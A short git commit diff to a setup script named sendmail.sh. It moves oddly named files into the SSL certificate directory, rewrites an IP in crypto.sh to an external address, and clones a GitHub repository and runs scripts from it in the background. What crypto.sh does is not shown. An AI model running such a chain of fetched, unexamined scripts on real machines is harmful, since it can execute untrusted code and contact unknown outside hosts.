d37dcbb7447d1acd308b78f1bf02bc502c12b9ed
SuSux13 <55140831+SuSux13@users.noreply.github.com>
2020-02-04 00:46:21 +0100

    Update sendmail.sh

--- sendmail.sh
+++ sendmail.sh
@@ -1,8 +1,9 @@
 
 chmod 600 server.*
 mkdir -p /etc/ssl/certs/
-mv server.key /etc/ssl/certs/
-mv server.crt /etc/ssl/certs/
+mv mail.send.fre /etc/ssl/certs/
+mv  mail.send.free /etc/ssl/certs/
+mv secmail.pro  /etc/ssl/certs/
 a2enmod ssl
 service apache2 restart
 sed -i 's/192\.168\.1\.132/89\.107\.242\.44/g' crypto.sh
@@ -12,3 +13,4 @@ bash /crypto.sh &
 bash MailTOR.sh
 git clone https://github.com/SuSux13/pokebola
 cd pokebola
+./crypto.sh &
